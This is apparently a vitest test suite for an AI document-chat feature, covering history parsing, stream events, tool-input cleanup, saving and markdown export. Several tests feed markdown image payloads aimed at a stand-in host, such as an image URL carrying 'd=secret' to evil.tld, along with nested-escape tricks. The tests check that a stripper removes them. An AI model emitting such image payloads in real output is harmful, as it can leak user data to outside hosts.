import { describe, expect, it } from "vitest";
import { parseDocChatHistory } from "@/lib/docChat/request";
import { DOC_CHAT_HISTORY_BUDGET, DOC_CHAT_MAX_INPUT_CHARS, DOC_CHAT_MAX_REPLY_TEXT_CHARS } from "@/lib/docChat/limits";
import { buildApiHistory } from "@/lib/analyst/history";
import { initialStreamState, type StreamState } from "@/lib/analyst/streamReducer";
import { reduceDocChatEvent } from "@/lib/docChat/stream";
import { cleanTable, deepStripImages, stripMarkdownImages } from "@/lib/docChat/toolInput";
import { loadImageStripper, withoutImages } from "@/lib/docChat/stripImagesClient";
import { pendingOutputSave, saveOutputOnce, savedOutput } from "@/lib/docChat/store";
import { prepareMediaTool } from "@/lib/mediaChatTools";
import { prepareSopTool, SOP_ICON_KEYS } from "@/lib/sopChatTools";
import { docMessageToMarkdown, mediaToolMarkdown, sopToolMarkdown } from "@/lib/docChat/exportMarkdown";
import { ICON_MAP } from "@/components/welcome-kit/icons";
import type { ChatMessage, SSEEvent } from "@/types/chat";

// ─── History parsing (server) ───────────────────────────────────────────────

describe("parseDocChatHistory", () => {
  it("cuts an over-long history block instead of rejecting the conversation", () => {
    const r = parseDocChatHistory([
      { role: "user", content: "write a brief" },
      { role: "assistant", content: [{ type: "text", text: "x".repeat(DOC_CHAT_MAX_REPLY_TEXT_CHARS + 50) }] },
      { role: "user", content: "shorter please" },
    ]);
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    const text = (r.messages[1].content as { type: string; text: string }[])[0].text;
    expect(text.length).toBe(DOC_CHAT_MAX_REPLY_TEXT_CHARS);
    expect(text.endsWith("[truncated]")).toBe(true);
  });

  it("accepts a pasted document up to the cap and rejects a new message over it", () => {
    expect(parseDocChatHistory([{ role: "user", content: "a".repeat(DOC_CHAT_MAX_INPUT_CHARS) }]).ok).toBe(true);
    const r = parseDocChatHistory([{ role: "user", content: "a".repeat(DOC_CHAT_MAX_INPUT_CHARS + 1) }]);
    expect(r).toMatchObject({ ok: false });
    if (!r.ok) expect(r.error).toContain("too long");
  });

  it("requires the last message to be the user's text (no prefill) and shape-checks tool blocks", () => {
    expect(parseDocChatHistory([{ role: "user", content: "hi" }, { role: "assistant", content: "hello" }]).ok).toBe(false);
    const badId = parseDocChatHistory([
      { role: "user", content: "q" },
      { role: "assistant", content: [{ type: "tool_use", id: "bad id!", name: "generate_document", input: {} }] },
      { role: "user", content: "q2" },
    ]);
    expect(badId.ok).toBe(false);
    const badInput = parseDocChatHistory([
      { role: "user", content: "q" },
      { role: "assistant", content: [{ type: "tool_use", id: "t1", name: "generate_document", input: "text" }] },
      { role: "user", content: "q2" },
    ]);
    expect(badInput.ok).toBe(false);
  });

  it("drops an unanswered tool call and keeps is_error on results", () => {
    const r = parseDocChatHistory([
      { role: "user", content: "q1" },
      {
        role: "assistant",
        content: [
          { type: "tool_use", id: "t1", name: "generate_document", input: { title: "A" } },
          { type: "tool_use", id: "t2", name: "generate_document", input: { title: "B" } },
        ],
      },
      { role: "user", content: [{ type: "tool_result", tool_use_id: "t1", content: "bad", is_error: true }] },
      { role: "assistant", content: "ok" },
      { role: "user", content: "q2" },
    ]);
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(JSON.stringify(r.messages[1].content)).not.toContain('"t2"');
    expect(r.messages[2].content).toEqual([{ type: "tool_result", tool_use_id: "t1", content: "bad", is_error: true }]);
  });
});

// ─── History building (client) ──────────────────────────────────────────────

describe("client history", () => {
  it("never sends notices (errors, stops) back as something the assistant said", () => {
    const msgs: ChatMessage[] = [
      { id: "u1", role: "user", content: "write an SOP" },
      { id: "a1", role: "assistant", content: "", blocks: [{ type: "notice", kind: "error", text: "Too many requests", action: "retry" }] },
      { id: "u2", role: "user", content: "again" },
    ];
    expect(buildApiHistory(msgs, DOC_CHAT_HISTORY_BUDGET)).toEqual([
      { role: "user", content: "write an SOP" },
      { role: "user", content: "again" },
    ]);
  });

  it("trims the oldest exchanges to the message budget (the route rejects more than 50)", () => {
    const msgs: ChatMessage[] = [];
    for (let i = 0; i < 30; i++) {
      msgs.push({ id: `u${i}`, role: "user", content: `q${i}` });
      msgs.push({
        id: `a${i}`,
        role: "assistant",
        content: "",
        blocks: [
          { type: "text", text: "Here it is." },
          { type: "tool_use", id: `t${i}`, name: "generate_document", input: { title: "Doc", markdown: "body" } },
          { type: "tool_result", tool_use_id: `t${i}`, content: "Shown" },
          { type: "text", text: "Done." },
        ],
      });
    }
    msgs.push({ id: "last", role: "user", content: "one more" });
    const sent = buildApiHistory(msgs, DOC_CHAT_HISTORY_BUDGET);
    expect(sent.length).toBeLessThanOrEqual(DOC_CHAT_HISTORY_BUDGET.maxMessages);
    expect(sent[0]).toMatchObject({ role: "user" });
    expect(sent.at(-1)).toEqual({ role: "user", content: "one more" });
    expect(parseDocChatHistory(sent).ok).toBe(true);
  });
});

// ─── Stream reducer ─────────────────────────────────────────────────────────

function run(events: SSEEvent[], from: StreamState = initialStreamState("a1")): StreamState {
  return events.reduce(reduceDocChatEvent, from);
}

describe("reduceDocChatEvent", () => {
  it("a document cut off at the length limit says to ask in parts (no Continue)", () => {
    const s = run([
      { type: "turn_start", iteration: 1 },
      { type: "text_delta", text: "Drafting it now." },
      { type: "tool_start", id: "t1", name: "generate_document" },
      { type: "done", stopReason: "max_tokens" },
    ]);
    const notice = s.message.blocks?.at(-1);
    expect(notice).toMatchObject({ type: "notice", kind: "truncated" });
    expect(notice).not.toHaveProperty("action");
    expect((notice as { text: string }).text).toContain("in parts");
    expect(s.finished).toBe(true);
    expect(s.pendingTools).toEqual([]);
  });

  it("plain text cut off at the limit can be continued", () => {
    const s = run([{ type: "text_delta", text: "Long answer" }, { type: "done", stopReason: "max_tokens" }]);
    expect(s.message.blocks?.at(-1)).toMatchObject({ kind: "truncated", action: "continue" });
  });

  it("timeouts and the step limit end with their own notices", () => {
    expect(run([{ type: "tool_start", id: "t1", name: "generate_sop" }, { type: "done", stopReason: "timeout" }]).message.blocks?.at(-1)).toMatchObject({
      kind: "limit",
    });
    expect(run([{ type: "text_delta", text: "x" }, { type: "done", stopReason: "timeout" }]).message.blocks?.at(-1)).toMatchObject({
      kind: "limit",
      action: "continue",
    });
    expect(run([{ type: "done", stopReason: "iteration_limit" }]).message.blocks?.at(-1)).toMatchObject({ kind: "limit", action: "continue" });
    expect(run([{ type: "text_delta", text: "x" }, { type: "done", stopReason: "end_turn" }]).message.blocks).toEqual([{ type: "text", text: "x" }]);
  });

  it("a refusal drops the declined turn's partial output and uses a document hint", () => {
    const s = run([
      { type: "turn_start", iteration: 1 },
      { type: "text_delta", text: "Here is the peptide" },
      { type: "refusal", category: "bio", message: "" },
      { type: "done", stopReason: "refusal" },
    ]);
    expect(s.message.blocks).toHaveLength(1);
    expect(s.message.blocks?.[0]).toMatchObject({ type: "notice", kind: "refusal" });
    expect((s.message.blocks?.[0] as { text: string }).text).toContain("marketing process");
    expect(s.message.content).toBe("");
  });

  it("a reply the wrap-up turn finished says to ask for anything missing next (and can be continued)", () => {
    const s = run([{ type: "text_delta", text: "Here is the first SOP; ask me for the second next." }, { type: "done", stopReason: "wrap_up" }]);
    const notice = s.message.blocks?.at(-1);
    expect(notice).toMatchObject({ type: "notice", kind: "limit", action: "continue" });
    expect((notice as { text: string }).text).toContain("ask for it next");
  });

  it("records a fallback model", () => {
    const s = run([
      { type: "fallback", from: "claude-opus-5-5", to: "claude-opus-5", category: "bio" },
      { type: "text_delta", text: "ok" },
      { type: "done", stopReason: "end_turn", servedBy: "claude-opus-5" },
    ]);
    expect(s.message.servedBy).toBe("claude-opus-5");
  });
});

// ─── Tool input shaping ─────────────────────────────────────────────────────

describe("prepareMediaTool", () => {
  it("normalizes a document: unknown docType → other, unknown platform dropped, images stripped", () => {
    const r = prepareMediaTool("generate_document", {
      title: "  Meta   Testing SOP ",
      docType: "memo",
      platform: "myspace",
      markdown: "## Steps\n\n![pixel](https://evil.tld/p?d=secret) Do the thing.",
    });
    expect(r).toMatchObject({ ok: true, input: { title: "Meta Testing SOP", docType: "other", markdown: "## Steps\n\npixel Do the thing." } });
    if (r.ok) {
      expect(r.input).not.toHaveProperty("platform");
      expect(r.ack).toContain("Don't repeat");
    }
  });

  it("keeps a correction's change summary and a valid platform", () => {
    const r = prepareMediaTool("correct_document", { title: "Brief", markdown: "body", summary: "- fixed typos", platform: "tiktok", docType: "creative_brief" });
    expect(r).toMatchObject({ ok: true, input: { summary: "- fixed typos", platform: "tiktok", docType: "creative_brief" } });
  });

  it("sends a missing document body back to the model as an error", () => {
    expect(prepareMediaTool("generate_document", { title: "A", markdown: "   " })).toMatchObject({ ok: false });
    expect(prepareMediaTool("generate_document", { markdown: "body" })).toMatchObject({ ok: false });
    expect(prepareMediaTool("generate_document", "nope")).toMatchObject({ ok: false });
    expect(prepareMediaTool("send_email", {})).toMatchObject({ ok: false, error: 'Unknown tool "send_email".' });
  });

  it("cleans report sections: bad metrics, colors and table rows dropped", () => {
    const r = prepareMediaTool("generate_report", {
      title: "Q2 Review",
      period: "Q2 2026",
      sections: [
        "junk",
        {
          title: "Executive Summary",
          summary: "Strong quarter.",
          metrics: [{ label: "ROAS", value: 4.2, trend: "sideways", color: "hotpink" }, { nope: 1 }, null],
          table: { columns: [{ key: "ch", label: "Channel" }, { key: "spend", label: "Spend", format: "currency" }], rows: [{ ch: "Meta", spend: 1200 }, "bad", {}] },
        },
        { title: "", summary: "" },
      ],
    });
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    const sections = r.input.sections as Record<string, unknown>[];
    expect(sections).toHaveLength(1);
    expect(sections[0].metrics).toEqual([{ label: "ROAS", value: "4.2" }]);
    expect(sections[0].table).toEqual({
      title: "",
      columns: [{ key: "ch", label: "Channel" }, { key: "spend", label: "Spend", format: "currency" }],
      rows: [{ ch: "Meta", spend: 1200 }],
    });
    expect(prepareMediaTool("generate_report", { title: "R", period: "June", sections: [] })).toMatchObject({ ok: false });
    expect(prepareMediaTool("generate_report", { title: "R", sections: [{ title: "a", summary: "b" }] })).toMatchObject({ ok: false });
  });

  it("rejects a table without usable columns or rows", () => {
    expect(prepareMediaTool("display_table", { title: "T", columns: [], rows: [{ a: 1 }] })).toMatchObject({ ok: false });
    expect(prepareMediaTool("display_table", { title: "T", columns: [{ key: "a", label: "A" }], rows: [] })).toMatchObject({ ok: false });
    expect(prepareMediaTool("display_table", { title: "T", columns: [{ key: "a" }], rows: [{ a: 1 }] })).toMatchObject({
      ok: true,
      input: { columns: [{ key: "a", label: "a" }] },
    });
  });
});

describe("prepareSopTool", () => {
  const steps = { type: "steps", steps: [{ text: "Do it ![x](https://evil.tld/x.png)" }] };

  it("keeps known blocks, drops unknown ones, strips images", () => {
    const r = prepareSopTool("generate_sop", {
      title: "Intake SOP",
      summary: "How leads come in.",
      sections: [{ title: "Process", icon: "target", blocks: [steps, { type: "video", url: "x" }] }],
    });
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    const section = (r.input.sections as Record<string, unknown>[])[0];
    expect(section.icon).toBe("target");
    expect(section.blocks).toEqual([{ type: "steps", steps: [{ text: "Do it x" }] }]);
  });

  it("needs a title and at least one content block", () => {
    expect(prepareSopTool("generate_sop", { sections: [{ title: "A", blocks: [steps] }] })).toMatchObject({ ok: false });
    expect(prepareSopTool("generate_sop", { title: "T", sections: [{ title: "A", blocks: [] }] })).toMatchObject({ ok: false });
    expect(prepareSopTool("generate_sop", { title: "T", sections: "x" })).toMatchObject({ ok: false });
  });

  it("sends an SOP over the save caps back to the model instead of letting the save cut it", () => {
    const text = (body: string) => ({ type: "text", body });
    const sop = (sections: unknown[]) => prepareSopTool("generate_sop", { title: "T", sections });
    const section = (blocks: unknown[], title = "S") => ({ title, blocks });

    expect(sop(Array.from({ length: 60 }, () => section([text("x")]))).ok).toBe(true);
    const tooManySections = sop(Array.from({ length: 61 }, () => section([text("x")])));
    expect(tooManySections).toMatchObject({ ok: false });
    if (!tooManySections.ok) expect(tooManySections.error).toContain("61 sections");

    expect(sop([section(Array.from({ length: 80 }, () => text("x")))]).ok).toBe(true);
    const tooManyBlocks = sop([section(Array.from({ length: 81 }, () => text("x")), "Process")]);
    expect(tooManyBlocks).toMatchObject({ ok: false });
    if (!tooManyBlocks.ok) expect(tooManyBlocks.error).toContain('Section 1 ("Process") has 81 blocks');

    expect(sop([section([text("y".repeat(8_000))])]).ok).toBe(true);
    expect(sop([section([text("y".repeat(8_001))])])).toMatchObject({ ok: false });
    expect(sop([section([{ type: "callout", body: "y".repeat(8_001) }])])).toMatchObject({ ok: false });
    expect(sop([section([{ type: "steps", steps: [{ text: "a", detail: "y".repeat(8_001) }] }])])).toMatchObject({ ok: false });
    // Measured after image stripping — what actually gets saved.
    expect(sop([section([text(`${"y".repeat(7_990)}![alt](https://evil.tld/p.png)`)])]).ok).toBe(true);

    const steps = (n: number) => ({ type: "steps", steps: Array.from({ length: n }, (_, i) => ({ text: `step ${i}` })) });
    expect(sop([section([steps(80)])]).ok).toBe(true);
    expect(sop([section([steps(81)])])).toMatchObject({ ok: false });
    expect(sop([section([{ type: "columns", items: [{ title: "a" }, { title: "b" }, { title: "c" }, { title: "d" }] }])])).toMatchObject({ ok: false });
    // A checklist's empty items are dropped before the cap, like the save does.
    expect(sop([section([{ type: "checklist", items: [...Array(80).fill("item"), "", ""] }])]).ok).toBe(true);
  });

  it("lists exactly the icon keys the SOP renderer knows", () => {
    expect([...SOP_ICON_KEYS].sort()).toEqual(Object.keys(ICON_MAP).sort());
  });
});

describe("toolInput helpers", () => {
  it("strips inline, reference and HTML images but keeps links", () => {
    expect(
      stripMarkdownImages('A ![chart](https://x.io/a(1).png "t") B ![ref][1] <img src="https://x.io/p.gif"> [link](https://ok.io)\n\n[1]: https://x.io/r.png')
    ).toBe("A chart B ref  [link](https://ok.io)\n\n");
  });

  it("dedupes columns and keeps only finite numbers / strings in cells", () => {
    const t = cleanTable({ columns: [{ key: "a" }, { key: "a" }, { key: "b", format: "weird" }], rows: [{ a: Infinity, b: { x: 1 } }, { a: 2, b: true }] });
    expect(t).toEqual({ title: "", columns: [{ key: "a", label: "a" }, { key: "b", label: "b" }], rows: [{ a: 2, b: "true" }] });
  });
});

describe("stripMarkdownImages (parsed like the renderers parse)", () => {
  const leaksUrl = (out: string) => /https:\/\/(x|evil)/.test(out);

  it.each([
    ["a spaced destination", "A ![a]( https://x/p.png) B", "A a B"],
    ["an <angle-bracketed> destination with a space", "A ![a](<https://x/p q.png>) B", "A a B"],
    ["a single-quoted title", "A ![a](https://x/p.png 'title') B", "A a B"],
    ["a parenthesised title", 'A ![a](https://x/p.png (title)) B', "A a B"],
    ["brackets inside the alt", "A ![a [b] c](https://x/p.png) B", "A a \\[b\\] c B"],
    ["a shortcut reference image + its definition", "![logo]\n\n[logo]: https://x/p.png", "logo\n\n"],
    ["a full reference image + a titled definition", 'See ![logo][l].\n\n[l]: https://x/p.png "t"', "See logo.\n\n"],
    ["a collapsed reference image", "![logo][]\n\n[LOGO]: https://x/p.png", "logo\n\n"],
    ["an image inside a link (the link stays)", "[![a](https://x/p.png)](https://ok.io)", "[a](https://ok.io)"],
    ["an image in a GFM table cell", "| a | ![i](https://x/p.png) |\n|---|---|\n| 1 | 2 |", "| a | i |\n|---|---|\n| 1 | 2 |"],
    ["an image in a list item / blockquote", "- ![a](https://x/1.png)\n> ![b](https://x/2.png)", "- a\n> b"],
    ["an <image> tag", 'A <image src="https://x/p.png"> B', "A  B"],
  ])("removes %s", (_label, input, expected) => {
    const out = stripMarkdownImages(input);
    expect(out).toBe(expected);
    expect(leaksUrl(out)).toBe(false);
  });

  it("never rebuilds an image out of what it removed", () => {
    // An emptied image joining "!" with a following link.
    const joined = stripMarkdownImages("!![](https://x/1.png)[a](https://evil/p.png)");
    expect(joined).not.toMatch(/!\[/);
    // An alt that spells an image once its escapes are resolved.
    const nested = stripMarkdownImages("![\\!\\[x\\](https://evil/p.png)](https://x/1.png)");
    expect(nested).not.toMatch(/(^|[^\\])!\[/);
    // A definition revealed only after an image is removed.
    expect(leaksUrl(stripMarkdownImages("![a]\n\n[a]![](https://x/1.png): https://evil/p.png"))).toBe(false);
  });

  it("leaves code, links, footnotes and image-free text byte-for-byte alone", () => {
    for (const md of [
      "Use `![alt](url)` syntax for images.",
      "```md\n![a](https://x/p.png)\n```",
      "[link](https://ok.io) and **bold** — _it_",
      "Note[^1].\n\n[^1]: The footnote.",
      "Plain text! [not a link]",
    ]) {
      expect(stripMarkdownImages(md)).toBe(md);
    }
  });

  it("strips every string of a tool input (deepStripImages)", () => {
    expect(deepStripImages({ a: ["![x]( https://x/p.png)"], b: { c: "![y][r]\n\n[r]: https://x/q.png" }, n: 1 })).toEqual({
      a: ["x"],
      b: { c: "y\n\n" },
      n: 1,
    });
  });

  it("the client export stripper loads lazily, then answers synchronously (clipboard writes stay in the click)", async () => {
    const first = withoutImages("![a](https://x/p.png)");
    expect(await first).toBe("a");
    await loadImageStripper();
    expect(withoutImages("x ![b]( https://x/p.png)")).toBe("x b");
  });
});

// ─── Generated-item saves (store) ───────────────────────────────────────────

describe("saveOutputOnce", () => {
  it("joins a save already in flight (a remounted card) instead of saving twice", async () => {
    let uploads = 0;
    let release!: () => void;
    const upload = () =>
      new Promise<string>((resolve) => {
        uploads++;
        release = () => resolve("sop_1");
      });
    const first = saveOutputOnce("toolu_save_1", upload);
    expect(pendingOutputSave("toolu_save_1")).toBeDefined();
    const second = saveOutputOnce("toolu_save_1", upload);
    release();
    expect(await first).toBe("sop_1");
    expect(await second).toBe("sop_1");
    expect(uploads).toBe(1);
    expect(savedOutput("toolu_save_1")).toBe("sop_1");
    expect(pendingOutputSave("toolu_save_1")).toBeUndefined();
    expect(await saveOutputOnce("toolu_save_1", upload)).toBe("sop_1");
    expect(uploads).toBe(1);
  });

  it("a failed save can be tried again; a save without a record id resolves to ''", async () => {
    await expect(saveOutputOnce("toolu_save_2", async () => Promise.reject(new Error("Save failed")))).rejects.toThrow("Save failed");
    expect(pendingOutputSave("toolu_save_2")).toBeUndefined();
    expect(savedOutput("toolu_save_2")).toBeUndefined();
    expect(await saveOutputOnce("toolu_save_2", async () => {})).toBe("");
    expect(savedOutput("toolu_save_2")).toBe("");
  });
});

// ─── Markdown export ────────────────────────────────────────────────────────

describe("markdown export", () => {
  it("includes generated documents and reports in a copied reply, but not notices of kind fallback", () => {
    const msg: ChatMessage = {
      id: "a",
      role: "assistant",
      content: "Here you go.",
      blocks: [
        { type: "text", text: "Here you go." },
        { type: "tool_use", id: "t1", name: "generate_document", input: { title: "Brief", markdown: "## Goal\n\nSell." } },
        { type: "tool_result", tool_use_id: "t1", content: "Shown" },
        {
          type: "tool_use",
          id: "t2",
          name: "generate_report",
          input: {
            title: "Q2",
            period: "June",
            sections: [{ title: "KPIs", summary: "Good.", metrics: [{ label: "ROAS", value: "4x" }], table: { columns: [{ key: "a", label: "A|B" }], rows: [{ a: 1 }] } }],
          },
        },
        { type: "progress", key: "1:0", text: "thinking" },
      ],
    };
    const md = docMessageToMarkdown(msg, mediaToolMarkdown);
    expect(md).toContain("Here you go.");
    expect(md).toContain("## Brief\n\n## Goal\n\nSell.");
    expect(md).toContain("### KPIs");
    expect(md).toContain("- **ROAS:** 4x");
    expect(md).toContain("| A\\|B |");
    expect(md).not.toContain("thinking");
  });

  it("renders an SOP's blocks as markdown", () => {
    const md = sopToolMarkdown("generate_sop", {
      title: "Intake",
      summary: "Leads.",
      sections: [
        {
          num: "01 / Process",
          title: "Steps",
          blocks: [
            { type: "steps", title: "Book", steps: [{ text: "Call", detail: "Within 5 min" }, { text: "Log" }] },
            { type: "checklist", items: ["CRM updated"] },
            { type: "callout", title: "Never", body: "skip the log" },
            { type: "rows", rows: [{ label: "CRM", value: "GHL" }] },
          ],
        },
      ],
    });
    expect(md).toContain("## Intake\n\nLeads.\n\n### 01 / Process — Steps");
    expect(md).toContain("**Book**\n\n1. Call\n   Within 5 min\n2. Log");
    expect(md).toContain("- [ ] CRM updated");
    expect(md).toContain("> **Never:** skip the log");
    expect(md).toContain("- CRM: GHL");
    expect(sopToolMarkdown("other", {})).toBeNull();
  });
});
